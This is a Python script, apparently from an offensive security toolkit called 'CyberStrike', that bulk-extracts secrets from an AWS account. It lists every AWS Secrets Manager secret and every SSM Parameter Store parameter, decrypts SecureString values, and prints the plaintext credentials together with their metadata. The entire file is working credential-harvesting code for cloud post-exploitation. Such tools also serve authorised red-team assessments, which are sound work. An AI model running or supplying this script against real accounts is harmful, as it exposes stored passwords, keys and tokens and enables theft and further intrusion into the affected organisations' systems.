#!/usr/bin/env python3
"""
secrets_dump.py — AWS Secrets Manager and SSM Parameter Store Extraction

Extracts all secrets from AWS Secrets Manager and SSM Parameter Store
(including SecureString parameters).

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import sys
import time
from datetime import datetime

try:
    import boto3
    from botocore.exceptions import ClientError
except ImportError:
    print("ERROR: boto3 required. Install: pip3 install boto3", file=sys.stderr)
    sys.exit(1)


def get_session(args):
    kwargs = {}
    if args.profile:
        kwargs["profile_name"] = args.profile
    if args.region:
        kwargs["region_name"] = args.region
    return boto3.Session(**kwargs)


class SecretsDumper:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.secrets_count = 0
        self.params_count = 0

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — AWS Secrets Extraction")
        print("=" * 70)
        print(f"PID:       {os.getpid()}")
        print(f"Profile:   {self.args.profile or 'default'}")
        print(f"Region:    {self.args.region or 'default'}")
        print(f"Output:    {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:   {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record, default=str), flush=True)
        else:
            source = record.get("source", "info")
            name = record.get("name", "")
            detail = record.get("detail", "")
            print(f"[{source.upper():<12}] {name:<50} {detail}", flush=True)
            if record.get("value") and not self.args.json_output:
                val = record["value"]
                if len(val) > 100:
                    val = val[:100] + "..."
                print(f"  -> value: {val}", flush=True)

    def dump_secrets_manager(self, session):
        if not self.running:
            return
        sm = session.client("secretsmanager")
        try:
            paginator = sm.get_paginator("list_secrets")
            for page in paginator.paginate():
                if not self.running:
                    break
                for secret in page.get("SecretList", []):
                    if not self.running:
                        break
                    name = secret["Name"]
                    arn = secret.get("ARN", "")

                    try:
                        value_response = sm.get_secret_value(SecretId=name)
                        value = value_response.get("SecretString")
                        if not value and value_response.get("SecretBinary"):
                            value = f"[BINARY: {len(value_response['SecretBinary'])} bytes]"

                        self.secrets_count += 1
                        self.emit({
                            "source": "secrets_mgr",
                            "name": name,
                            "detail": f"arn={arn}",
                            "arn": arn,
                            "value": value,
                            "version_id": value_response.get("VersionId"),
                            "created_date": secret.get("CreatedDate"),
                            "last_changed": secret.get("LastChangedDate"),
                            "last_accessed": secret.get("LastAccessedDate"),
                            "tags": secret.get("Tags", []),
                        })
                    except ClientError as e:
                        self.emit({"source": "secrets_mgr", "name": name, "detail": f"access denied: {e}", "status": "denied"})
        except ClientError as e:
            self.emit({"source": "secrets_mgr", "name": "list_secrets", "detail": f"error: {e}"})

    def dump_ssm_parameters(self, session):
        if not self.running:
            return
        ssm = session.client("ssm")
        try:
            paginator = ssm.get_paginator("describe_parameters")
            for page in paginator.paginate():
                if not self.running:
                    break
                for param in page.get("Parameters", []):
                    if not self.running:
                        break
                    name = param["Name"]
                    param_type = param.get("Type", "String")

                    try:
                        value_response = ssm.get_parameter(Name=name, WithDecryption=True)
                        value = value_response["Parameter"].get("Value", "")

                        self.params_count += 1
                        self.emit({
                            "source": "ssm_param",
                            "name": name,
                            "detail": f"type={param_type} version={param.get('Version', 'N/A')}",
                            "type": param_type,
                            "value": value,
                            "version": param.get("Version"),
                            "last_modified": param.get("LastModifiedDate"),
                            "last_modified_user": param.get("LastModifiedUser"),
                            "tier": param.get("Tier"),
                        })
                    except ClientError as e:
                        self.emit({"source": "ssm_param", "name": name, "detail": f"access denied: {e}", "status": "denied"})
        except ClientError as e:
            self.emit({"source": "ssm_param", "name": "describe_parameters", "detail": f"error: {e}"})

    def run(self):
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        session = get_session(self.args)

        self.dump_secrets_manager(session)
        self.dump_ssm_parameters(session)

        self.cleanup()

    def cleanup(self):
        print(f"\n--- secrets_dump summary ---")
        print(f"Secrets Manager: {self.secrets_count}")
        print(f"SSM Parameters:  {self.params_count}")
        print(f"Total records:   {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Extract secrets from AWS Secrets Manager and SSM Parameter Store.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 secrets_dump.py\n"
            "  python3 secrets_dump.py --profile prod --region eu-west-1 --json-output\n"
        ),
    )
    parser.add_argument("--profile", type=str, default=None, help="AWS profile name")
    parser.add_argument("--region", type=str, default=None, help="AWS region")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    dumper = SecretsDumper(args)
    dumper.run()


if __name__ == "__main__":
    main()
